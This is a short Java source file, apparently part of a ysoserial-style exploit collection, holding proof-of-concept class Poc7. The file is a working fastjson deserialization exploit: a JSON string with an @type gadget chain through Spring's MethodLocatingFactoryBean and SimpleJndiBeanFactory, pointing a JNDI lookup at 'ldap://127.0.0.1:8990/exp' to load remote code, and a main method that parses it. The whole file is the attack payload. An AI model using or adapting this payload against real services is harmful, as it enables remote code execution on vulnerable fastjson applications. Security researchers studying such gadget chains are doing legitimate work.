package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc7 {
    public static void main(String[] args) {
        // 1
        String poc = "{\"@type\":\"Lorg.springframework.aop.config.MethodLocatingFactoryBean;\",\"methodName\":\"sssss\",\"targetBeanName\":\"ldap://127.0.0.1:8990/exp\",\"beanFactory\":{\"@type\":\"Lorg.springframework.jndi.support.SimpleJndiBeanFactory;\"}}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
